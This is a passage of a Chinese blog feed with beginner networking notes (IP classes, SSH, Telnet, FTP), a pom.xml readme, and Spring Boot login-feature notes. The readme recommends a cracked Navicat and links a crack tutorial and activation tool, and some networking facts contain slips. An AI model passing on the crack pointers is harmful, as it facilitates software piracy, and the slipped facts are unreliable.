        <content type="html"><![CDATA[<h1 id="概念介绍"><a href="#概念介绍" class="headerlink" title="概念介绍"></a>概念介绍</h1><ol><li><p>内网（Intranet）</p><p>内网是指一个组织、公司或机构<strong>内部的局域网络</strong>（LAN），通常由路由器、交换机和防火墙等网络设备组成。内网的主要特点是安全性较高，只有组织内部的计算机和设备才能够互相访问和通信，对外部的计算机和设备是不可见的。内网通常用于组织内部的文件共享、内部通信和管理等。</p></li><li><p>外网（Internet）</p><p>外网是指<strong>全球互联网</strong>，也称为公共网络。外网是由全球各地的计算机和设备组成的庞大网络，可以让用户在任何地方进行通信和交流。外网的主要特点是开放的、公共的和不可控的，任何人都可以通过互联网访问和使用。</p></li><li><p>公网（Public Network）</p><p>公网是指<strong>可以被公众访问的网络</strong>，如互联网、移动网络等。公网通常由多个网络运营商共同构成，提供可靠的互联互通服务，可以让用户在不同的网络之间进行通信和交流。</p></li><li><p>私网（Private Network）</p><p>私网是指一个<strong>组织内部的局域网络</strong>（LAN），通常由路由器、交换机和防火墙等网络设备组成。私网的主要特点是安全性较高，只有组织内部的计算机和设备才能够互相访问和通信，对外部的计算机和设备是不可见的。私网通常用于组织内部的文件共享、内部通信和管理等。</p></li><li><p>IP</p></li></ol><p><img src="https://cdn.jsdelivr.net/gh/S1gma0/image/202308011009650.png"></p><p>A类</p><p>(1.0.0.0-126.0.0.0)（默认子网掩码：255.0.0.0或 0xFF000000）</p><p>0*******       ********     ********     ********           二进制</p><p>1—126 0—255 0—255 1—254        十进制</p><p><strong>（127去哪了？—回环网段，用来做测试，能ping通说明网卡协议没问题。）</strong></p><p>B类</p><p>(128.0.0.0-191.255.0.0)（默认子网掩码：255.255.0.0或0xFFFF0000）</p><p>10******         ********      ********      ********</p><p>128—191 0—255 0—255 1—254</p><p>C类</p><p>(192.0.0.0-223.255.255.0)（子网掩码：255.255.255.0或 0xFFFFFF00）</p><p>110*****          ********     ********      ********</p><p>192—233 0—255 0—255 1—254</p><p>D类</p><p>是多播地址。该类IP地址的最前面为“1110”，所以地址的网络号取值于224~239之间。一般用于多路广播用户。</p><p>E类</p><p>是保留地址。该类IP地址的最前面为“1111”，所以地址的网络号取值于240~255之间。</p><p>127</p><p>“127.0.0.1” 到 “127.255.255.255” 是保留用于环回测试的IPv4地址范围，通常用于本地主机上的自我回环（loopback）测试。在这个范围内，最常用的地址是 “127.0.0.1”，它被称为本地回环地址。当计算机系统尝试通过网络协议与自己通信时，它会使用本地回环地址。</p><p>这个地址范围不会被路由到网络上，因此任何发送到这个范围内的地址的数据包都会被本地系统处理，而不会离开计算机。这使得开发人员能够测试网络功能而无需连接到实际网络。</p><p>总的来说，”127.0.0.1” 是一个特殊的IP地址，用于本地主机自我回环测试。</p><h1 id="公网-amp-私网的IP区别"><a href="#公网-amp-私网的IP区别" class="headerlink" title="公网&amp;私网的IP区别"></a>公网&amp;私网的IP区别</h1><p>下边的是常用的私网IP：</p><p>10.0.0.0-10.255.255.255</p><p>172.16.0.0-172.31.255.255</p><p>192.168.0.0-192.168.255.255</p><p>其余的都是公网IP</p><h1 id="公网-amp-私网的区别"><a href="#公网-amp-私网的区别" class="headerlink" title="公网&amp;私网的区别"></a>公网&amp;私网的区别</h1><p>公网和私网的区别是公网是指可以被公众访问的网络，如互联网、移动网络等，而私网是指组织内部的局域网，只有组织内部的计算机和设备才能够互相访问和通信。</p><h1 id="内网-amp-外网的区别"><a href="#内网-amp-外网的区别" class="headerlink" title="内网&amp;外网的区别"></a>内网&amp;外网的区别</h1><p>内网和外网的区别是<strong>内网是指局域网</strong>，只有组织内部的计算机和设备才能够互相访问和通信，而<strong>外网是指全球互联网</strong>，任何人都可以访问和使用。</p><h1 id="内网-amp-私网的区别"><a href="#内网-amp-私网的区别" class="headerlink" title="内网&amp;私网的区别"></a>内网&amp;私网的区别</h1><p> 内网和私网的区别是内网是指组织内部的局域网，而私网是指一个组织内部的局域网，两者的概念有些相似，但<strong>内网更加宽泛，可以包括多个私网</strong>。</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>SSH</title>
      <link href="/2023/07/27/SSH/"/>
      <url>/2023/07/27/SSH/</url>
      
        <content type="html"><![CDATA[<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>SSH（Secure Shell）协议<strong>基于TCP协议，</strong>是一种用于在网络上安全传输数据的协议。</p><p>它是一种加密的协议，可用于在不安全的网络上进行远程登录、文件传输和命令执行等操作，以确保这些操作的机密性和完整性。</p><p><img src="https://cdn.jsdelivr.net/gh/S1gma0/image/202307270039964.png"></p><p>SSH 使用客户端-服务器（C/S）模型，<strong>默认端口是 22</strong>。SSH 是一个守护进程，负责实时监听客户端请求，并进行处理。</p><p>SSH协议分为两个主要版本：SSH1和SSH2。SSH1已经被认为是不安全的，现在已经被SSH2取代。SSH2协议是目前使用最广泛的版本，它提供了更好的安全性和可靠性。</p><h1 id="加密原理"><a href="#加密原理" class="headerlink" title="加密原理"></a>加密原理</h1><h2 id="对称加密"><a href="#对称加密" class="headerlink" title="对称加密"></a>对称加密</h2><h2 id="非对称加密"><a href="#非对称加密" class="headerlink" title="非对称加密"></a>非对称加密</h2><p>在使用SSH连接到远程计算机之前，用户必须生成一对密钥（公钥和私钥）。在建立SSH连接时，远程计算机会向用户发送一个随机数，并要求用户对该随机数进行加密。用户使用私钥对随机数进行加密后，将其发送回远程计算机。远程计算机使用用户的公钥对加密后的随机数进行解密，以验证用户的身份。</p><p>例：B有一对密钥，A想向B发消息，先发送一个请求。B收到请求后将公钥给A，A用公钥将传送的信息加密，B收到加密信息后用私钥解密。关键：使用私钥解密公钥。</p><p>注意：但是会遇到“<strong>中间人攻击</strong>”的问题，如下：</p><p>中间人C拦截A的请求，冒充B发送假公钥给A。A会把假公钥加密的信息传给C，C接收到信息并解密获取到信息。</p><h2 id="免密登录"><a href="#免密登录" class="headerlink" title="免密登录"></a>免密登录</h2><p><a href="https://blog.csdn.net/Azoner/article/details/123764052">https://blog.csdn.net/Azoner/article/details/123764052</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Telnet</title>
      <link href="/2023/07/27/Telnet/"/>
      <url>/2023/07/27/Telnet/</url>
      
        <content type="html"><![CDATA[<p>Telnet协议是一种在网络上远程登录到其他计算机的标准协议。</p><p>它基于<strong>TCP协议</strong>，用于通过一个终端登陆到其它服务器。</p><p><img src="https://cdn.jsdelivr.net/gh/S1gma0/image/202307270025967.png"></p><div align = "center">Telnet:远程登陆协议</div><p>由于telnet的通信过程采用<strong>明文传输</strong>(包括用户名和密码)，所以它的安全性较差，容易受到网络攻击。因此，现在很少使用Telnet协议进行远程登录，而更多地使用SSH（Secure Shell）协议，这是一种更安全的协议，它使用加密技术来保护通信过程中的数据安全。</p><p>这就是为什么如今很少使用 Telnet，而是使用一种称为 SSH 的非常安全的网络传输协议的主要原因。</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>FTP</title>
      <link href="/2023/07/27/FTP/"/>
      <url>/2023/07/27/FTP/</url>
      
        <content type="html"><![CDATA[<p>FTP（File Transfer Protocol，文件传输协议）是一种标准的网络协议。它<strong>基于TCP协议</strong>，是一种用于在计算机之间传输文件的协议，可以屏蔽操作系统和文件存储方式。它是最早开发的用于文件传输的协议之一，并且今天仍被广泛使用。</p><p>FTP采用客户端-服务器（C/S）模型，在客户端与 FTP 服务器之间建立<strong>两个</strong>连接。</p><p><img src="https://cdn.jsdelivr.net/gh/S1gma0/image/202307270012952.png"></p><p>FTP 的独特的优势同时也是与其它客户服务器程序最大的不同点就在于它在两台通信的主机之间使用了<strong>两条 TCP 连接</strong>（其它客户服务器应用程序一般只有一条 TCP 连接）：</p><ol><li>控制连接：用于传送控制信息（命令和响应）</li><li>数据连接：用于数据传送；</li></ol><p>这种将命令和数据分开传送的思想大大提高了 FTP 的效率。</p><p>注意 ⚠️：<strong>FTP 是一种不安全的协议</strong>，因为它在传输过程中不会对数据进行加密。因此，FTP 传输的文件可能会被窃听或篡改。建议在传输敏感数据时使用更安全的协议，如 SFTP（一种基于 SSH 协议的安全文件传输协议，用于在网络上安全地传输文件）。</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>FTP匿名身份验证</title>
      <link href="/2023/07/20/FTP%E5%8C%BF%E5%90%8D%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81/"/>
      <url>/2023/07/20/FTP%E5%8C%BF%E5%90%8D%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81/</url>
      
        <content type="html"><![CDATA[<p>s</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>115Readme</title>
      <link href="/2023/07/07/Readme/"/>
      <url>/2023/07/07/Readme/</url>
      
        <content type="html"><![CDATA[<h1 id="文件概述"><a href="#文件概述" class="headerlink" title="文件概述"></a>文件概述</h1><p>Project.md是开发文档，db.sql是数据库的结构和数据文件，reggie_take_out.zip是项目压缩包</p><h1 id="软件环境"><a href="#软件环境" class="headerlink" title="软件环境"></a>软件环境</h1><p>MySQL 8.0</p><p>Java 1.8</p><p>Navicat Premium 16.0.11 破解版</p><p>让管理数据库更加方便</p><p>破解版安装教程见<a href="https://baijiahao.baidu.com/s?id=1740186081850554942&amp;wfr=spider&amp;for=pc">https://baijiahao.baidu.com/s?id=1740186081850554942&amp;wfr=spider&amp;for=pc</a></p><p>安装包及破解程序：navicat16激活工具和安装包.zip</p><p>IntelliJ IDEA 2023.1.1 (Ultimate Edition)</p><p>安装程序：ideaIU-2023.1.1.exe</p><p>使用学生认证，不必破解</p><h1 id="项目依赖配置"><a href="#项目依赖配置" class="headerlink" title="项目依赖配置"></a>项目依赖配置</h1><p>使用maven进行项目管理，项目前后端分离。</p><p>前端UI使用了Vue.js和Element UI进行开发设计</p><p>后台管理系统使用了SpringBoot、mybatis-plus，配置了阿里的镜像</p><p>详细配置见\reggie_take_out\pom.xml，如下：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">project</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://maven.apache.org/POM/4.0.0&quot;</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">modelVersion</span>&gt;</span>4.0.0<span class="tag">&lt;/<span class="name">modelVersion</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">parent</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-parent<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.4.5<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">relativePath</span>/&gt;</span> <span class="comment">&lt;!-- lookup parent from repository --&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">parent</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>cn.reggie<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>reggie_take_out<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.0-SNAPSHOT<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">properties</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">java.version</span>&gt;</span>1.8<span class="tag">&lt;/<span class="name">java.version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">maven.compiler.source</span>&gt;</span>8<span class="tag">&lt;/<span class="name">maven.compiler.source</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">maven.compiler.target</span>&gt;</span>8<span class="tag">&lt;/<span class="name">maven.compiler.target</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">project.build.sourceEncoding</span>&gt;</span>UTF-8<span class="tag">&lt;/<span class="name">project.build.sourceEncoding</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">properties</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-test<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">scope</span>&gt;</span>test<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-web<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">scope</span>&gt;</span>compile<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.baomidou<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>mybatis-plus-boot-starter<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.4.2<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.projectlombok<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>lombok<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.18.20<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.alibaba<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>fastjson<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.2.76<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>commons-lang<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-lang<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.6<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>mysql<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>mysql-connector-java<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">scope</span>&gt;</span>runtime<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.alibaba<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>druid-spring-boot-starter<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.1.23<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">build</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">plugins</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">plugin</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-maven-plugin<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.4.5<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">plugin</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">plugins</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">build</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">project</span>&gt;</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Project</title>
      <link href="/2023/05/18/Project/"/>
      <url>/2023/05/18/Project/</url>
      
        <content type="html"><![CDATA[<p>config里放配置文件，entity包里放实体类，resources里放管理端和用户端的静态页面等文件，common放通用类和全局异常处理器，filter放过滤器。</p><h1 id="后台登录功能"><a href="#后台登录功能" class="headerlink" title="后台登录功能"></a>后台登录功能</h1><h2 id="需求分析"><a href="#需求分析" class="headerlink" title="需求分析"></a>需求分析</h2><p>前端的login.html中的登录功能，要求服务端处理完登录的账号、密码后，给前端响应的数据里应当含有code,data,msg。而且数据的格式应该是jason格式</p><p><img src="https://cdn.jsdelivr.net/gh/S1gma0/image/202305181738934.png"></p><p>点击登录按钮，请求地址是<code>http://localhost:8080/employee/login</code></p><p>POST请求方式</p><p><img src="https://cdn.jsdelivr.net/gh/S1gma0/image/202305181925067.png"></p><p>成功登录后，本地浏览器缓存中由employee的数据</p><p><img src="https://cdn.jsdelivr.net/gh/S1gma0/image/202305191648672.png"></p><h2 id="代码开发"><a href="#代码开发" class="headerlink" title="代码开发"></a>代码开发</h2><p>（1）创建实体类Employee，和数据库中的employee表进行映射。</p><p><img src="https://cdn.jsdelivr.net/gh/S1gma0/image/202305201759187.png"></p><p>（2）创建出大致结构。</p><p>EmployeeMapper接口</p><p><img src="https://cdn.jsdelivr.net/gh/S1gma0/image/202305181852010.png"></p><p>EmployeeService接口</p><p><img src="https://cdn.jsdelivr.net/gh/S1gma0/image/202305181900123.png"></p><p>EmployeeServiceImpl实现类</p><p><img src="https://cdn.jsdelivr.net/gh/S1gma0/image/202305181915998.png"></p><p>EmployeeController</p><p><img src="https://cdn.jsdelivr.net/gh/S1gma0/image/202305182038183.png"></p><p>（3）导入返回结果类R</p><p>此类是一个通用类，服务端响应的所有结果最终都会包装成这种类型返回给前端页面。</p><p><img src="https://cdn.jsdelivr.net/gh/S1gma0/image/202305191634996.png"></p><p>（4）在Controller中创建登录方法</p><p><img src="https://cdn.jsdelivr.net/gh/S1gma0/image/202305191317656.png"></p><p>处理逻辑如下:</p><p>1、将页面提交的密码password进行md5加密处理</p><p>2、根据页面提交的用户名username查询数据库</p><p>3、如果没有查询到则返回登录失败结果</p><p>4、密码比对，如果不一致则返回登录失败结果</p><p>5、查看员工状态，如果为已禁用状态，则返回员工已禁用结果</p><p>6、登录成功，将员工id存入Session并返回登录成功结果</p><p><img src="https://cdn.jsdelivr.net/gh/S1gma0/image/202305191635759.png"></p><h1 id="后台退出功能"><a href="#后台退出功能" class="headerlink" title="后台退出功能"></a>后台退出功能</h1><h2 id="需求分析-1"><a href="#需求分析-1" class="headerlink" title="需求分析"></a>需求分析</h2><p>员工登录成功后，页面跳转系统首界面（/backend/index.html），此时会显示当前用户的姓名。</p><p>如果员工需要退出系统，直接点击右侧的退出按钮可以直接退出系统。退出系统后页面应该跳转到登录界面（/backend//page/login/login.html）</p><h2 id="代码开发-1"><a href="#代码开发-1" class="headerlink" title="代码开发"></a>代码开发</h2><p>用户点击页面中退出按钮，发送请求，请求地址为/employee/logout，请求方式为POST。我们只需要在Controller中创建对应的处理方法即可，具体的处理逻辑：</p><p>1、清理Session中的用户id</p><p>2、返回结果</p><p><img src="https://cdn.jsdelivr.net/gh/S1gma0/image/202305191730192.png"></p><h2 id="功能测试"><a href="#功能测试" class="headerlink" title="功能测试"></a>功能测试</h2><p>退出登录后，页面跳转到登陆界面，并且浏览器缓存中的userinfo被清理</p><p><img src="https://cdn.jsdelivr.net/gh/S1gma0/image/202305191732011.png"></p><h1 id="完善登录功能"><a href="#完善登录功能" class="headerlink" title="完善登录功能"></a>完善登录功能</h1><h2 id="问题分析"><a href="#问题分析" class="headerlink" title="问题分析"></a>问题分析</h2><p>前面我们已经完成了后台系统的员工登录功能开发，但是还存在一个问题：<strong>用户如果不登录，直接访问系统首页面，照样可以正常访问</strong>。</p><p>这种设计并不合理，我们希望看到的效果应该是，只有登录成功后才可以访问系统中的页面，如果没有登录则跳转到登录页面。那么，具体应该怎么实现呢?</p><p>答案就是<strong>使用过滤器或者拦截器</strong>，在过滤器或者拦截器中判断用户是否已经完成登录，如果没有登录则跳转到登录页面。</p><h2 id="代码实现"><a href="#代码实现" class="headerlink" title="代码实现"></a>代码实现</h2><p>实现步骤：</p><p>1、创建自定义过滤器<code>LoginCheckFilter</code></p><p><img src="https://cdn.jsdelivr.net/gh/S1gma0/image/202305201156399.png"></p><p>2、在启动类上加入注解<code>@ServletComponentScan</code></p><p><img src="https://cdn.jsdelivr.net/gh/S1gma0/image/202305191820133.png"></p><p>3、完善过滤器的处理逻辑</p><p>过滤器具体的处理逻辑如下：</p><p><img src="https://cdn.jsdelivr.net/gh/S1gma0/image/202305191757125.png"></p><p>1、获取本次请求的URI</p><p>2、判断本次请求是否需要处理</p><p>3、如果不需要处理，则直接放行</p><p>4、判断登录状态，如果已登录，则直接放行</p><p>5、如果未登录则返回未登录结果</p><p><img src="https://cdn.jsdelivr.net/gh/S1gma0/image/202305201243022.png"></p><h1 id="新增员工"><a href="#新增员工" class="headerlink" title="新增员工"></a>新增员工</h1><h2 id="需求分析-2"><a href="#需求分析-2" class="headerlink" title="需求分析"></a>需求分析</h2><p>后台系统中可以管理员工信息，通过新增员工来添加后台系统用户。</p><p>点击[添加员工]按钮跳转到新增页面，如下:</p><p><img src="https://cdn.jsdelivr.net/gh/S1gma0/image/202305201410988.png"></p><h2 id="数据模型"><a href="#数据模型" class="headerlink" title="数据模型"></a>数据模型</h2><p>新增员工，其实就是将我们新增页面录入的员工数据插入到employee表。</p><p>需要注意，<strong>employee表中对username字段加入了唯一约束</strong>，因为username是员工的登录账号，必须是唯一的。</p><p><img src="https://cdn.jsdelivr.net/gh/S1gma0/image/202305201420020.png"></p><p>employee表中的status字段已经设置了默认值1，表示正常</p><p><img src="https://cdn.jsdelivr.net/gh/S1gma0/image/202305201421163.png"></p><h2 id="代码开发-2"><a href="#代码开发-2" class="headerlink" title="代码开发"></a>代码开发</h2><p>先尝试在前端添加员工，这个请求以POST的方式发送到<code>http://localhost:8080/employee</code></p><p><img src="https://cdn.jsdelivr.net/gh/S1gma0/image/202305201429420.png"></p><p>发送请求的参数是JSON格式的</p><p><img src="https://cdn.jsdelivr.net/gh/S1gma0/image/202305201428371.png"></p><p>在开发代码之前，需要梳理一下整个程序的执行过程:</p><p>1、页面发送ajax请求，将新增员工页面中输入的数据以json的形式提交到服务端</p><p>2、服务端Controller接收页面提交的数据并调用Service将数据进行保存</p><p>3、Service调用Mapper操作数据库，保存数据</p><p><img src="https://cdn.jsdelivr.net/gh/S1gma0/image/202305201802785.png"></p><p>前面的程序还存在一个问题，就是当我们在新增员工时输入的账号已经存在，由于employee表中对该字段加入了唯—约束，此时程序会抛出异常：</p><p><img src="https://cdn.jsdelivr.net/gh/S1gma0/image/202305201806289.png"></p><p>此时需要我们的程序进行异常捕获，通常有两种处理方式：</p><p>1、在Controller方法中加入try.catch进行异常捕获。但是这种方法不是很好，如果新增数据很多，那trycatch会写很多遍。下面的代码只是针对当前这一种情况来处理。</p><p><img src="https://cdn.jsdelivr.net/gh/S1gma0/image/202305201809141.png"></p><p>2、使用异常处理器进行全局异常捕获</p><p><img src="https://cdn.jsdelivr.net/gh/S1gma0/image/202305201845469.png"></p><h1 id="员工信息分页查询"><a href="#员工信息分页查询" class="headerlink" title="员工信息分页查询"></a>员工信息分页查询</h1><h2 id="需求分析-3"><a href="#需求分析-3" class="headerlink" title="需求分析"></a>需求分析</h2><p>系统中的员工很多的时候，如果在一个页面中全部展示出来会显得比较乱，不便于查看，所以一般的系统中都会以分页的方式来展示列表数据。</p><h2 id="代码开发-3"><a href="#代码开发-3" class="headerlink" 